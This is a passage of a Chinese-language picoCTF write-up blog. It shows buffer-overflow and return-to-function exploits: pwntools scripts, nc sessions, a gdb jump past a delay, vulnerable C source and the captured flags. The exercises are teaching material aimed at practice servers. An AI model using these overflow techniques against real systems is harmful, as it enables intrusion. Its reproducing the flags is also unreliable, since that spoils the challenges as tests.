        puts(&#34;No data yet&#34;);
        continue;
      }
      data_read();
      puts(&#34;Read successful, would you like to do anything else?&#34;);
    } else if (command == 3) {
      return 0;
    } else {
      puts(&#34;Please type either 1, 2 or 3&#34;);
      puts(&#34;Maybe breaking boundaries elsewhere will be helpful&#34;);
    }
  }

  return 0;
}
</code></pre><p>:::</p><h3 id=recon-1>Recon
<a class=anchor href=#recon-1>#</a></h3><p>這一題感覺真的不像PWN題，比較像是reverse</p><ol><li>注意讀取flag的地方是在<code>data_read()</code>的地方，且entry要是零
我一開始的想法是往回推，所以要進到<code>data_read()</code>一開始的input就要選<code>2</code>，但會得到<code>No data yet</code>的結果，原因是input變數還是零(一開始的global variable有定義initia l value)</li><li>所以現在必須要想如何才能改變input variable的變數，答案就是<code>data_write()</code>，當寫入字串成功時會在這個function的最後給予一個entry，其實就是<code>input++</code>得來的，所以我們要做的事情就是
先寫任意的數值的database $\to$ 進入<code>data_read()</code>讀取entry 0的data</li></ol><h3 id=exploit---reverse-carefully>Exploit - Reverse Carefully
<a class=anchor href=#exploit---reverse-carefully>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc saturn.picoctf.net <span style=color:#ae81ff>65317</span>
</span></span><span style=display:flex><span>Hi, welcome to my echo chamber!
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#39;1&#39;</span> to enter a phrase into our database
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#39;2&#39;</span> to echo a phrase in our database
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#39;3&#39;</span> to exit the program
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Please enter your data:
</span></span><span style=display:flex><span><span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span>Please enter the length of your data:
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>Your entry number is: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Write successful, would you like to <span style=color:#66d9ef>do</span> anything <span style=color:#66d9ef>else</span>?
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Please enter the entry number of your data:
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942<span style=color:#f92672>}</span>
</span></span></code></pre></div><hr><h2 id=challenge-buffer-overflow-0>Challenge: buffer overflow 0🍰
<a class=anchor href=#challenge-buffer-overflow-0>#</a></h2><h3 id=source-code-2>Source Code
<a class=anchor href=#source-code-2>#</a></h3><p>:::spoiler Source Code</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf(&#34;%s\n&#34;, flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
  if (f == NULL) {
    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
                    &#34;own debugging flag.\n&#34;);
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf(&#34;Input: &#34;);
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf(&#34;The program will exit now\n&#34;);
  return 0;
}
</code></pre><p>:::</p><h3 id=recon-2>Recon
<a class=anchor href=#recon-2>#</a></h3><p>這一題比想像中簡單，算是給新手認識BoF的機會，可以看到source code中寫到只要觸發segmentation fault就會轉給<code>sigsegv_handler</code>這個function把flag印出來，而會遇到segmentation fault的地方就是第18行的strcpy function，只要給的input length大於buf2就會產生</p><h3 id=exploit---simple-bof>Exploit - Simple BoF
<a class=anchor href=#exploit---simple-bof>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nc saturn.picoctf.net <span style=color:#ae81ff>51532</span>
</span></span><span style=display:flex><span>Input: aaaaaaaaaaaaaaaaaaaa
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>ov3rfl0ws_ar3nt_that_bad_90d2bb58<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>實測需要輸入20個字元才會觸發</p><hr><h2 id=challenge-clutter-overflow>Challenge: clutter-overflow🍰
<a class=anchor href=#challenge-clutter-overflow>#</a></h2><h3 id=recon-3>Recon
<a class=anchor href=#recon-3>#</a></h3><p>應該算是最簡單的BoF，可以用靜態或是動態的方式觀察offset有多少，然後把code的地方蓋成0xdeadbeef就可以拿到flag了</p><h3 id=exploit-2>Exploit
<a class=anchor href=#exploit-2>#</a></h3><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

# r = process(&#39;chall&#39;)
r = remote(&#34;mars.picoctf.net&#34;, 31890)

r.recvuntil(b&#39;What do you see?\n&#39;)
r.sendline(b&#39;a&#39; * (0x110-0x8) + p64(0xdeadbeef))

r.interactive()
</code></pre><p>Flag: <code>picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}</code></p><hr><h2 id=challenge-wine-1>Challenge: wine:-1:
<a class=anchor href=#challenge-wine-1>#</a></h2><h3 id=recon-4>Recon
<a class=anchor href=#recon-4>#</a></h3><p>這題很爛的原因是明明很簡單，但是用pwntools寫script卻沒辦法成功，但payload是一樣的，我有想過要用python -c的方式pipe out給server但一樣不成功，不知道為甚麼，看了其他人的WP也有提到一樣的問題，搞得我好亂啊啊啊啊啊啊啊!!!</p><p>(23/8/4)更新:打windows的題目要把new line改成\r\n，所以才會沒有成功</p><h3 id=exploit-3>Exploit
<a class=anchor href=#exploit-3>#</a></h3><p>:::spoiler</p><pre tabindex=0><code class="language-bash=" data-lang="bash=">$ echo &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0\x15@\x00&#34; | nc saturn.picoctf.net 50417
Give me a string!
picoCTF{Un_v3rr3_d3_v1n_dcc38bed}
Unhandled exception: page fault on read access to 0x7fec3900 in 32-bit code (0x7fec3900).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:7fec3900 ESP:0064fe84 EBP:61616161 EFLAGS:00010206(  R- --  I   - -P- )
 EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4
 ESI:00000005 EDI:0021d6d0
Stack dump:
0x0064fe84:  00000000 00000004 00000000 7b432ecc
0x0064fe94:  00230e78 0064ff28 00401386 00000002
0x0064fea4:  00230e70 006d0da0 7bcc4625 00000004
0x0064feb4:  00000008 00230e70 0021d6d0 0077ccf9
0x0064fec4:  28364527 00000000 00000000 00000000
0x0064fed4:  00000000 00000000 00000000 00000000
Backtrace:
=&gt;0 0x7fec3900 (0x61616161)
0x7fec3900: addb        %al,0x0(%eax)
Modules:
Module  Address                 Debug info      Name (5 modules)
PE        400000-  44b000       Deferred        vuln
PE      7b020000-7b023000       Deferred        kernelbase
PE      7b420000-7b5db000       Deferred        kernel32
PE      7bc30000-7bc34000       Deferred        ntdll
PE      7fe10000-7fe14000       Deferred        msvcrt
Threads:
process  tid      prio (all id:s are in hex)
00000008 vuln.exe
        00000009    0
0000000c services.exe
        0000000e    0
        0000000d    0
0000001f (D) Z:\challenge\vuln.exe
        00000020    0 &lt;==
00000024 explorer.exe
        00000025    0
System information:
    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)
    Platform: i386
    Version: Windows Server 2008 R2
    Host system: Linux
    Host version: 5.19.0-1024-aws
</code></pre><p>:::
(23/8/4)更新:New Exploit</p><pre tabindex=0><code class=language-python! data-lang=python!>from pwn import *

r = remote(&#34;saturn.picoctf.net&#34;, 53396)
# r = process(&#34;./vuln.exe&#34;)
r.recvline()
context.newline = b&#39;\r\n&#39;
payload = b&#39;a&#39;*0x8c + p32(0x401530)
r.sendline(payload)

r.interactive()
</code></pre><p>Flag: <code>picoCTF{Un_v3rr3_d3_v1n_dcc38bed}</code></p><hr><h2 id=challenge-local-target>Challenge: Local Target🍰
<a class=anchor href=#challenge-local-target>#</a></h2><h3 id=recon-5>Recon
<a class=anchor href=#recon-5>#</a></h3><p>這一題超簡單，不知道為啥超少人解，就只是蓋掉原本的num變成65而已</p><h3 id=exploit---array-bound>Exploit - Array Bound
<a class=anchor href=#exploit---array-bound>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaaaaaaaaaaA&#34;</span> | nc saturn.picoctf.net <span style=color:#ae81ff>57591</span>
</span></span><span style=display:flex><span>Enter a string:
</span></span><span style=display:flex><span>num is <span style=color:#ae81ff>65</span>
</span></span><span style=display:flex><span>You win!
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>l0c4l5_1n_5c0p3_fee8ef05<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Flag: <code>picoCTF{l0c4l5_1n_5c0p3_fee8ef05}</code></p><hr><h2 id=challenge-picker-iv>Challenge: Picker IV🍰
<a class=anchor href=#challenge-picker-iv>#</a></h2><h3 id=recon-6>Recon
<a class=anchor href=#recon-6>#</a></h3><p>這一題也是超簡單但是不知道為啥也很少人解，單純的return 2 series</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ file picker-IV
picker-IV: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=12b33c5ff389187551aae5774324da558cee006c, for GNU/Linux 3.2.0, not stripped
$ checksec picker-IV
[*] &#39;/mnt/d/NTU/CTF/PicoCTF/PWN/Picker IV/picker-IV&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ objdump -d -M intel ./picker-IV | grep &#34;win&#34;
000000000040129e &lt;win&gt;:
  4012d2:       75 16                   jne    4012ea &lt;win+0x4c&gt;
  4012f9:       eb 1a                   jmp    401315 &lt;win+0x77&gt;
  401319:       75 e0                   jne    4012fb &lt;win+0x5d&gt;
</code></pre><h3 id=exploit---ret2funcntion>Exploit - Ret2Funcntion
<a class=anchor href=#exploit---ret2funcntion>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>$ echo &#34;40129e&#34; | nc saturn.picoctf.net 50048
Enter the address in hex to jump to, excluding &#39;0x&#39;: You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
</code></pre><p>Flag: <code>picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}</code></p><hr><h2 id=challenge-hurry-up-wait>Challenge: Hurry up! Wait!🍰
<a class=anchor href=#challenge-hurry-up-wait>#</a></h2><h3 id=recon--prepare>Recon & Prepare
<a class=anchor href=#recon--prepare>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>$ file svchost.exe
svchost.exe: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dea7ec3bad6aeab52804d2a614b132f4af2a1025, stripped
$ checksec svchost.exe
[*] &#39;/mnt/d/NTU/CTF/PicoCTF/Reverse/Hurry up! Wait!/svchost.exe&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p>這一題唯一要注意的是可能會遇到</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ ./svchost.exe
./svchost.exe: error while loading shared libraries: libgnat-7.so.1: cannot open shared object file: No such file or directory
</code></pre><p>這個問題，所以只要安裝<code>libgnat-7</code>就可以了</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ sudo apt-get install -y libgnat-7
</code></pre><p>安裝完之後先執行看看，發現沒有任何output或是其他提示，所以用ida看了一下會發現他在<code>main->sub_298A()->ada__calendar__delays__delay_for(1000000000000000LL);</code>有檔一個delay，預期只要跳過這個地方就可以完成後續的step</p><h3 id=exploit-4>Exploit
<a class=anchor href=#exploit-4>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>$ gdb svchost.exe
gef➤  starti
gef➤  vmmap # 先確認code section的base address在哪
gef➤  b *(0x555555400000+0x2998)
gef➤  c
gef➤  j *(0x555555400000+0x299d)
</code></pre><p>這樣就可以拿到flag
Flag: <code>picoCTF{d15a5m_ftw_87e5ab1}</code></p><hr><h2 id=challenge-droid0-1>Challenge: droid0:-1:
<a class=anchor href=#challenge-droid0-1>#</a></h2><h3 id=recon--prepare-1>Recon & Prepare
<a class=anchor href=#recon--prepare-1>#</a></h3><p>這一題簡單到不可思議，難的地方是要想辦法把他run起來，不是指用android studio而是進入android studio之後，不確定是不是版本太舊或是其他原因他會一直噴錯，再加上是第一次使用這個工具，所以也不確定要看哪邊解決問題，所以如果有人遇到模擬器開不起來的狀況，可以看一下最右邊的notification，他會告訴你缺了甚麼，要不要安裝之類的簡單排除問題
<img src=https://hackmd.io/_uploads/r1N91a8Rn.png alt></p><h3 id=exploit-5>Exploit
<a class=anchor href=#exploit-5>#</a></h3><p>在emulator上隨便打一些字，然後click button，只要查看底下的log就會看到flag了
<img src=https://hackmd.io/_uploads/H1gJg6LA2.png alt></p><p>Flag: <code>picoCTF{a.moose.once.bit.my.sister}</code></p><hr><h2 id=challenge-webnet1>Challenge: WebNet1🍰
<a class=anchor href=#challenge-webnet1>#</a></h2><h3 id=exploit---import-tls-key--string-seach>Exploit - Import TLS Key / String Seach
<a class=anchor href=#exploit---import-tls-key--string-seach>#</a></h3><p>承接<a href=https://hackmd.io/@SBK6401/HJqySDHla>WebNet0</a>，先import題目提供的private key解密中間所有的通訊，然後會看到中間有query一個網站，他提供了一張禿鷹的圖片，把圖片dump下來後直接string search就可以拿到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ strings vulture.jpg | grep pico
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>honey.roasted.peanuts<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Flag: <code>picoCTF{honey.roasted.peanuts}</code></p><hr></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#challenge-logon>Challenge: <a href="https://play.picoctf.org/practice/challenge/46?category=1&amp;page=1">logon</a>🍰</a><ul><li><a href=#exploit---set-cookie>Exploit - Set cookie</a></li></ul></li><li><a href=#challenge-where-are-the-robots>Challenge: <a href="https://play.picoctf.org/practice/challenge/4?category=1&amp;page=1">where are the robots</a>🍰</a><ul><li><a href=#exploit---robotstxt>Exploit - robots.txt</a></li></ul></li><li><a href=#challenge-packets-primer>Challenge: <a href="https://play.picoctf.org/practice/challenge/286?category=4&amp;page=2">Packets Primer</a>🍰</a><ul><li><a href=#exploit---search--string-directly>Exploit - search <code>{</code> string directly</a></li></ul></li><li><a href=#challenge-disk-disk-sleuth>Challenge: <a href=https://mercury.picoctf.net/static/920731987787c93839776ce457d5ecd6/dds1-alpine.flag.img.gz>Disk, disk, sleuth!</a>🍰</a><ul><li><a href=#exploit---strings-search>Exploit - Strings search</a></li></ul></li><li><a href=#challenge-sleuthkit-apprentice>Challenge: <a href="https://play.picoctf.org/practice/challenge/300?category=4&amp;page=3">Sleuthkit Apprentice</a>🍰</a><ul><li><a href=#exploit---ftk-imager>Exploit - FTK Imager</a></li></ul></li><li><a href=#challenge-st3g0>Challenge: <a href="https://play.picoctf.org/practice/challenge/305?category=4&amp;page=4">St3g0</a>🍰</a><ul><li><a href=#exploit---zsteg>Exploit - <code>zsteg</code></a></li></ul></li><li><a href=#challenge-the-numbers>Challenge: <a href="https://play.picoctf.org/practice?category=2&amp;page=1">The Numbers</a>🍰</a><ul><li><a href=#exploit---alphabetic-sequence>Exploit - Alphabetic Sequence</a></li></ul></li><li><a href=#challenge-b00tl3grsa2>Challenge: b00tl3gRSA2🍰</a><ul><li><a href=#exploit---large-e-in-rsa>Exploit - Large <code>e</code> in RSA</a></li></ul></li><li><a href=#challenge-sum-o-primes>Challenge: Sum-O-Primes🍰</a><ul><li><a href=#source-code>Source Code</a></li><li><a href=#exploit---easy>Exploit - Easy</a></li></ul></li><li><a href=#challenge-b00tl3grsa3>Challenge: b00tl3gRSA3🍰</a><ul><li><a href=#recon>Recon</a></li><li><a href=#exploit---smooth-value>Exploit - Smooth Value</a></li></ul></li><li><a href=#challenge-soap>Challenge: SOAP🍰</a><ul><li><a href=#exploit---the-simplest-xxe>Exploit - The simplest XXE</a></li></ul></li><li><a href=#challenge-picobrowser>Challenge: picobrowser🍰</a><ul><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#challenge-client-side-again>Challenge: Client-side-again🍰</a><ul><li><a href=#exploit---reverse-script>Exploit - Reverse Script</a></li></ul></li><li><a href=#challenge-forbidden-paths>Challenge: Forbidden Paths🍰</a><ul><li><a href=#exploit---easy-lfi>Exploit - Easy LFI</a></li></ul></li><li><a href=#challenge-keygenme>Challenge: keygenme🍰</a><ul><li><a href=#source>Source</a></li><li><a href=#exploit-1>Exploit</a></li></ul></li><li><a href=#challenge-basic-file-exploit-1>Challenge: basic-file-exploit:-1:</a><ul><li><a href=#background>Background</a></li><li><a href=#source-code-1>Source Code</a></li><li><a href=#recon-1>Recon</a></li><li><a href=#exploit---reverse-carefully>Exploit - Reverse Carefully</a></li></ul></li><li><a href=#challenge-buffer-overflow-0>Challenge: buffer overflow 0🍰</a><ul><li><a href=#source-code-2>Source Code</a></li><li><a href=#recon-2>Recon</a></li><li><a href=#exploit---simple-bof>Exploit - Simple BoF</a></li></ul></li><li><a href=#challenge-clutter-overflow>Challenge: clutter-overflow🍰</a><ul><li><a href=#recon-3>Recon</a></li><li><a href=#exploit-2>Exploit</a></li></ul></li><li><a href=#challenge-wine-1>Challenge: wine:-1:</a><ul><li><a href=#recon-4>Recon</a></li><li><a href=#exploit-3>Exploit</a></li></ul></li><li><a href=#challenge-local-target>Challenge: Local Target🍰</a><ul><li><a href=#recon-5>Recon</a></li><li><a href=#exploit---array-bound>Exploit - Array Bound</a></li></ul></li><li><a href=#challenge-picker-iv>Challenge: Picker IV🍰</a><ul><li><a href=#recon-6>Recon</a></li><li><a href=#exploit---ret2funcntion>Exploit - Ret2Funcntion</a></li></ul></li><li><a href=#challenge-hurry-up-wait>Challenge: Hurry up! Wait!🍰</a><ul><li><a href=#recon--prepare>Recon & Prepare</a></li><li><a href=#exploit-4>Exploit</a></li></ul></li><li><a href=#challenge-droid0-1>Challenge: droid0:-1:</a><ul><li><a href=#recon--prepare-1>Recon & Prepare</a></li><li><a href=#exploit-5>Exploit</a></li></ul></li><li><a href=#challenge-webnet1>Challenge: WebNet1🍰</a><ul><li><a href=#exploit---import-tls-key--string-seach>Exploit - Import TLS Key / String Seach</a></li></ul></li></ul></nav></div></aside></main></body></html>